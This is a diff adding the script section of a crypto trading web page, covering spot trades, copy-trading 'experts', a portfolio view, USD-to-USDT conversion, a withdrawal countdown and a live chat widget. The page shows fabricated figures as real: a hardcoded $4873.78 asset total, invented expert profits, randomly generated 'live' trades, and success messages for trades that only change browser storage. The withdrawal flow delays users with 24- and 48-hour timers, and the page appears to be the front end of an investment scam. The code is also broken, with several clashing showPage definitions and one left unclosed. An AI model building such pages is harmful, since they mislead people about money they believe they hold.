+  fetchWalletBalances();
+
+  // === Spot trade logic with balance validation ===
+  function spotTrade(action) {
+    const token = document.getElementById("spotToken").value;
+    const amount = parseFloat(document.getElementById("spotAmount").value);
+    const result = document.getElementById("spotTradeResult");
+    const wallet = localStorage.getItem("connectedWallet");
+
+    if (!wallet) {
+      result.textContent = "⚠ Please connect your wallet.";
+      return;
+    }
+
+    if (!amount || amount <= 0) {
+      result.textContent = "⚠ Enter a valid amount.";
+      return;
+    }
+
+    // Parse prices removing $ and commas
+    const priceMap = {
+      BTC: parseFloat(document.getElementById("btcPrice").textContent.replace(/[$,]/g, '')),
+      ETH: parseFloat(document.getElementById("ethPrice").textContent.replace(/[$,]/g, '')),
+      BNB: parseFloat(document.getElementById("bnbPrice").textContent.replace(/[$,]/g, '')),
+    };
+
+    if (isNaN(priceMap[token])) {
+      result.textContent = "⚠ Unable to retrieve price. Try again later.";
+      return;
+    }
+
+    // Get BNB balance in localStorage (simulated)
+    const bnbBalance = parseFloat(localStorage.getItem('BNB_BALANCE') || '0');
+    // Calculate total cost in USD
+    const totalCostUSD = priceMap[token] * amount;
+    // Calculate wallet BNB balance value in USD
+    const walletValueUSD = bnbBalance * priceMap['BNB'];
+
+    if (action === 'buy' && walletValueUSD < totalCostUSD) {
+      result.textContent = "❌ Insufficient balance to buy.";
+      return;
+    }
+
+    // Simulate trade processing
+    result.textContent = `${action === 'buy' ? 'Buying' : 'Selling'} ${amount} ${token}...`;
+
+    setTimeout(() => {
+      // Update Open Positions
+      const openPosDiv = document.getElementById("spotOpenPositions");
+      const newPosition = document.createElement("div");
+      newPosition.textContent = `${action.toUpperCase()} ${amount} ${token} @ $${priceMap[token].toFixed(2)}`;
+      openPosDiv.textContent = openPosDiv.textContent === "No open positions." ? "" : openPosDiv.textContent;
+      openPosDiv.appendChild(newPosition);
+
+      // Update Trade History
+      const tradeHistoryDiv = document.getElementById("spotTradeHistory");
+      const newHistoryEntry = document.createElement("div");
+      newHistoryEntry.textContent = `${new Date().toLocaleString()}: ${action.toUpperCase()} ${amount} ${token} @ $${priceMap[token].toFixed(2)}`;
+      tradeHistoryDiv.textContent = tradeHistoryDiv.textContent === "No trade history." ? "" : tradeHistoryDiv.textContent;
+      tradeHistoryDiv.appendChild(newHistoryEntry);
+
+      // Deduct cost from BNB balance on buy (simulate)
+      if (action === 'buy') {
+        const bnbUsed = totalCostUSD / priceMap['BNB'];
+        const newBnbBalance = Math.max(bnbBalance - bnbUsed, 0);
+        localStorage.setItem('BNB_BALANCE', newBnbBalance.toFixed(6));
+      } else if (action === 'sell') {
+        // Simulate crediting BNB balance on sell
+        const bnbGained = totalCostUSD / priceMap['BNB'];
+        const newBnbBalance = bnbBalance + bnbGained;
+        localStorage.setItem('BNB_BALANCE', newBnbBalance.toFixed(6));
+      }
+
+      // Refresh balances display (optional)
+      fetchWalletBalances();
+
+      result.textContent = "✅ Trade successful!";
+      document.getElementById("spotAmount").value = "";
+    }, 1000);
+  }
+  </script>
+    <!-- Ethers.js for wallet balance -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.min.js"></script>
+
+  <script>
+  // --- 1. Fetch live prices from CoinGecko every 20 seconds ---
+  async function fetchCopyTradePrices() {
+    try {
+      const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin&vs_currencies=usd");
+      const data = await res.json();
+
+      document.getElementById("btcPrice").textContent = "$" + data.bitcoin.usd.toLocaleString();
+      document.getElementById("ethPrice").textContent = "$" + data.ethereum.usd.toLocaleString();
+      document.getElementById("bnbPrice").textContent = "$" + data.binancecoin.usd.toLocaleString();
+    } catch (err) {
+      console.error("Price fetch error:", err);
+    }
+  }
+  setInterval(fetchCopyTradePrices, 20000);
+  fetchCopyTradePrices();
+
+  // --- 2. Fetch wallet BNB balance (simulate if no wallet) ---
+  async function fetchWalletBalancesCopyTrade() {
+    const address = localStorage.getItem('connectedWallet');
+    if (!address) {
+      console.warn("No wallet connected");
+      return;
+    }
+
+    try {
+      const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
+      const balance = await provider.getBalance(address);
+      const bnbBalance = parseFloat(ethers.formatEther(balance));
+      localStorage.setItem('BNB_BALANCE', bnbBalance.toFixed(6));
+      console.log(`BNB balance for ${address}: ${bnbBalance.toFixed(6)}`);
+      updatePortfolioDisplay(bnbBalance);
+    } catch (e) {
+      console.error("Error fetching wallet balance:", e);
+    }
+  }
+
+  // Simulate wallet if not connected
+  if(!localStorage.getItem('connectedWallet')) {
+    localStorage.setItem('connectedWallet', '0x0000000000000000000000000000000000000000');
+    localStorage.setItem('BNB_BALANCE', '5.000000'); // 5 BNB simulated balance
+  }
+  fetchWalletBalancesCopyTrade();
+
+  // --- Sample Data for Experts & Trades ---
+  const copyTradingExperts = [
+    { id: 1, name: "AliceTrader", profitPct: 18.5, followers: 1200, avatar: "https://i.pravatar.cc/60?img=1" },
+    { id: 2, name: "BobInvests", profitPct: 24.7, followers: 830, avatar: "https://i.pravatar.cc/60?img=2" },
+    { id: 3, name: "CryptoGuru", profitPct: 15.2, followers: 2340, avatar: "https://i.pravatar.cc/60?img=3" }
+  ];
+
+  const userPortfolio = [
+    { token: "BTC", amount: 0.05 },
+    { token: "ETH", amount: 0.4 },
+    { token: "BNB", amount: parseFloat(localStorage.getItem('BNB_BALANCE') || '5') }
+  ];
+
+  let liveCopiedTrades = [
+    { time: "10:15:23", expert: "AliceTrader", action: "BUY", amount: "0.01 BTC" },
+    { time: "10:16:10", expert: "BobInvests", action: "SELL", amount: "0.05 ETH" },
+    { time: "10:17:00", expert: "CryptoGuru", action: "BUY", amount: "1.5 BNB" }
+  ];
+
+  // --- Populate Experts List ---
+  function updateExpertsList() {
+    const container = document.getElementById("expertsList");
+    container.innerHTML = ""; // Clear existing
+    copyTradingExperts.forEach(expert => {
+      const card = document.createElement("div");
+      card.className = "flex items-center gap-4 bg-[#1e2124] rounded-xl p-4 shadow-md cursor-pointer hover:bg-[#292e33] transition";
+      card.innerHTML = `
+        <img src="${expert.avatar}" alt="${expert.name}" class="w-12 h-12 rounded-full border-2 border-[#f0b90b]" />
+        <div class="flex flex-col">
+          <span class="text-[#f0b90b] font-bold">${expert.name}</span>
+          <span class="text-sm text-gray-300">Profit: ${expert.profitPct}%</span>
+          <span class="text-sm text-gray-400">${expert.followers} followers</span>
+        </div>
+      `;
+      container.appendChild(card);
+    });
+  }
+
+  // --- Populate User Portfolio ---
+  function updatePortfolioDisplay(bnbBalance) {
+    const container = document.getElementById("portfolioDisplay");
+    container.innerHTML = ""; // Clear existing
+
+    userPortfolio.forEach(item => {
+      let amount = item.amount;
+      if(item.token === "BNB") amount = bnbBalance ?? amount;
+      const div = document.createElement("div");
+      div.className = "bg-[#0b0e11] rounded-lg px-4 py-3 min-w-[120px] text-center shadow";
+      div.innerHTML = `<strong class="block text-[#f0b90b]">${item.token}</strong><span>${amount.toFixed(6)}</span>`;
+      container.appendChild(div);
+    });
+  }
+
+  // --- Populate Live Copied Trades ---
+  function updateCopiedTrades() {
+    const list = document.getElementById("copiedTrades");
+    list.innerHTML = ""; // Clear existing
+
+    liveCopiedTrades.forEach(trade => {
+      const li = document.createElement("li");
+      li.textContent = `[${trade.time}] ${trade.expert} ${trade.action} ${trade.amount}`;
+      list.appendChild(li);
+    });
+  }
+
+  // --- Initial UI Updates ---
+  updateExpertsList();
+  updatePortfolioDisplay(parseFloat(localStorage.getItem('BNB_BALANCE')));
+  updateCopiedTrades();
+
+  // --- Simulate live trades every 30 seconds ---
+  setInterval(() => {
+    // Rotate trades
+    const newTrade = {
+      time: new Date().toLocaleTimeString(),
+      expert: copyTradingExperts[Math.floor(Math.random() * copyTradingExperts.length)].name,
+      action: Math.random() > 0.5 ? "BUY" : "SELL",
+      amount: (Math.random() * 0.1).toFixed(4) + " BTC"
+    };
+    liveCopiedTrades.unshift(newTrade);
+    if(liveCopiedTrades.length > 20) liveCopiedTrades.pop();
+    updateCopiedTrades();
+  }, 30000);
+
+  </script>
+    <script>
+    // Show Page without alert and store in localStorage
+    function showPage(pageId) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
+      const currentPage = document.getElementById(pageId);
+      if (currentPage) {
+        currentPage.classList.add('active-page');
+        localStorage.setItem('currentPage', pageId);
+        document.getElementById('pageNumberDisplay').textContent = `Current Page ID: ${pageId}`;
+      }
+    }
+
+    // Restore last page on reload
+    window.addEventListener('DOMContentLoaded', () => {
+      const savedPage = localStorage.getItem('currentPage') || 'dashboard';
+      showPage(savedPage);
+    });
+    </script>
+  <script>
+const STORAGE_PAGE_KEY = "activePageId";
+let totalAssetsUSD = 4873.78;
+
+window.addEventListener("DOMContentLoaded", () => {
+  const savedPage = localStorage.getItem(STORAGE_PAGE_KEY) || "dashboard";
+  showPage(savedPage);
+  updateTotalAssetsDisplay();
+  initConversionPage();
+  document.getElementById("currencySelect")?.addEventListener("change", (e) => {
+    // Future currency logic
+  });
+});
+
+function showPage(pageId) {
+  localStorage.setItem(STORAGE_PAGE_KEY, pageId);
+  document.querySelectorAll(".page").forEach((page) => {
+    page.classList.remove("active-page");
+    page.classList.add("hidden");
+  });
+  const page = document.getElementById(pageId);
+  if (page) {
+    page.classList.add("active-page");
+    page.classList.remove("hidden");
+  } else {
+    console.warn(`Page "${pageId}" not found`);
+  }
+}
+
+function updateTotalAssetsDisplay() {
+  const totalAssetsEl = document.getElementById("totalAssets");
+  if (totalAssetsEl) totalAssetsEl.textContent = `$${totalAssetsUSD.toFixed(2)}`;
+  const usdAmountInput = document.getElementById("usdAmount");
+  const estimatedUsdtSpan = document.getElementById("estimatedUsdt");
+  if (usdAmountInput && estimatedUsdtSpan) {
+    usdAmountInput.value = totalAssetsUSD.toFixed(2);
+    estimatedUsdtSpan.textContent = `${totalAssetsUSD.toFixed(2)} USDT`;
+  }
+}
+
+function showToast(message) {
+  const toast = document.createElement("div");
+  toast.textContent = message;
+  toast.className = "fixed bottom-5 left-1/2 transform -translate-x-1/2 bg-yellow-400 text-black px-4 py-2 rounded shadow-lg z-50 text-sm font-medium";
+  document.body.appendChild(toast);
+  setTimeout(() => toast.remove(), 3000);
+}
+
+function convertUsdToUsdt() {
+  const usd = parseFloat(document.getElementById("usdAmount").value);
+  const usdt = usd; // 1:1 conversion
+
+  // Save USDT balance in localStorage (mock)
+  localStorage.setItem("usdtBalance", usdt.toFixed(2));
+
+  // Update USDT balance display on dashboard if present
+  const usdtBalanceDisplay = document.getElementById("usdtBalance");
+  if (usdtBalanceDisplay) {
+    usdtBalanceDisplay.innerText = `${usdt.toFixed(2)} USDT`;
+  }
+
+  showToast(`Converted $${usd.toFixed(2)} USD to ${usdt.toFixed(2)} USDT successfully.`);
+
+  showPage("page9i");
+}
+
+function initConversionPage() {
+  // Attach convertUsdToUsdt to Convert button on page10
+  const convertBtn = document.querySelector("#page10 button.convert-btn");
+  if (convertBtn) {
+    convertBtn.onclick = convertUsdToUsdt;
+  }
+   // After short delay, show page10 again with countdown
+    setTimeout(() => {
+      showPage('page10');
+      start24HourCountdown();
+    }, 2000); // Show Page9i for 2 seconds
+  }
+
+  // ⏱️ Start Countdown
+  function start24HourCountdown() {
+    const existingEnd = localStorage.getItem('conversionEndTime');
+    let endTime;
+
+    if (!existingEnd) {
+      // 24 hours from now
+      endTime = Date.now() + 24 * 60 * 60 * 1000;
+      localStorage.setItem('conversionEndTime', endTime);
+    } else {
+      endTime = parseInt(existingEnd);
+    }
+
+    document.getElementById('countdownBox').classList.remove('hidden');
+    updateCountdown(endTime);
+
+    // Set interval to update every second
+    const intervalId = setInterval(() => {
+      const now = Date.now();
+      const remaining = endTime - now;
+
+      if (remaining <= 0) {
+        clearInterval(intervalId);
+        document.getElementById('countdownTimer').textContent = "00:00:00";
+        localStorage.removeItem('conversionEndTime');
+        return;
+      }
+
+      updateCountdown(endTime);
+    }, 1000);
+  }
+
+  // 🧮 Countdown Formatter
+  function updateCountdown(endTime) {
+    const now = Date.now();
+    const diff = endTime - now;
+
+    const hours = Math.floor(diff / (1000 * 60 * 60));
+    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+    const format = (n) => n.toString().padStart(2, '0');
+    document.getElementById('countdownTimer').textContent = `${format(hours)}:${format(minutes)}:${format(seconds)}`;
+  }
+
+    </script>
+  <script>
+  // Total assets from dashboard
+  const totalAssetsUSD = 4873.78;
+
+  // On page 8 show, initialize amount input with totalAssetsUSD
+  function initPage8() {
+    const amountInput = document.getElementById('transferAmount');
+    if (amountInput) {
+      amountInput.value = totalAssetsUSD.toFixed(2);
+    }
+  }
+
+  // Set amount input to max (total assets)
+  function setMaxAmount() {
+    const amountInput = document.getElementById('transferAmount');
+    if (amountInput) {
+      amountInput.value = totalAssetsUSD.toFixed(2);
+    }
+  }
+
+  // Override your global showPage to call initPage8 when page8 is shown
+  function showPage(pageId) {
+    // Hide all pages
+    document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
+    // Show requested page
+    const page = document.getElementById(pageId);
+    if (page) {
+      page.classList.remove('hidden');
+      // If it's page8, initialize amount
+      if (pageId === 'page8') {
+        initPage8();
+      }
+    }
+      </script>
+<script>
+  function showPage(pageId) {
+    // Hide all pages and remove active class
+    document.querySelectorAll('.page').forEach(page => {
+      page.classList.remove('active-page');
+      page.classList.add('hidden');
+    });
+
+    // Show the selected page and add active class
+    const target = document.getElementById(pageId);
+    if (target) {
+      target.classList.remove('hidden');
+      target.classList.add('active-page');
+    }
+  }
+</script>
+  <!-- Your page content -->
+
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+  var _smartsupp = _smartsupp || {};
+  _smartsupp.key = '3ab3e4c3fcd21f84344cc872db2a35d9e40245a6';
+  window.smartsupp || (function(d) {
+    var s, c, o = smartsupp = function() { o._.push(arguments); };
+    o._ = [];
+    s = d.getElementsByTagName('script')[0];
+    c = d.createElement('script');
+    c.type = 'text/javascript';
+    c.charset = 'utf-8';
+    c.async = true;
+    c.src = 'https://www.smartsuppchat.com/loader.js?';
+    s.parentNode.insertBefore(c, s);
+  })(document);
+</script>
+    <script>  
+  // ✅ Set max amount  
+  function setMaxAmount() {  
+    const totalAssets = 4873.78;  
+    const amountInput = document.getElementById("transferAmount");  
+    if (amountInput) {  
+      amountInput.value = totalAssets.toFixed(2);  
+    }  
+  }  
+  
+  // ✅ Handle Confirm Withdrawal + Timer  
+  function confirmWithdrawal() {  
+    // Show page 9i  
+    showPage('page9i');  
+  
+    // Set countdown timestamp (48 hours = 172800000ms)  
+    const now = new Date().getTime();  
+    const countdownEnd = now + 48 * 60 * 60 * 1000;  
+  
+    // Save to localStorage  
+    localStorage.setItem('countdownEnd', countdownEnd.toString());  
+  
+    // Optionally start the display updater immediately if on page9i  
+    if (typeof updateCountdownDisplay === "function") {  
+      updateCountdownDisplay();  
+    }  
+  }  
+    </script>
+  <script>
+  function updateCountdownDisplay() {
+    const countdownElement = document.getElementById('countdownTimer');
+    const countdownEnd = parseInt(localStorage.getItem('countdownEnd'));
+
+    if (!countdownEnd || !countdownElement) return;
+
+    const interval = setInterval(() => {
+      const now = new Date().getTime();
+      const remaining = countdownEnd - now;
+
+      if (remaining <= 0) {
+        countdownElement.innerText = "⏰ Countdown expired.";
+
+        // Clear interval and storage
+        clearInterval(interval);
+        localStorage.removeItem('countdownEnd');
+
+        // Redirect to page8iii after 2s
+        setTimeout(() => {
+          showPage('page8iii');
+        }, 2000);
+
+        return;
+      }
+
+      const hours = Math.floor((remaining / (1000 * 60 * 60)) % 48);
+      const minutes = Math.floor((remaining / (1000 * 60)) % 60);
+      const seconds = Math.floor((remaining / 1000) % 60);
+
+      countdownElement.innerText = `⏳ ${hours}h ${minutes}m ${seconds}s remaining`;
+    }, 1000);
+  }
+
+  // ✅ Auto-start countdown if page9i is active
+  document.addEventListener("DOMContentLoaded", () => {
+    const currentPage = document.querySelector(".active-page");
+    if (currentPage && currentPage.id === "page9i") {
+      updateCountdownDisplay();
+    }
+  });
+  </script>
+</body>
+</html>
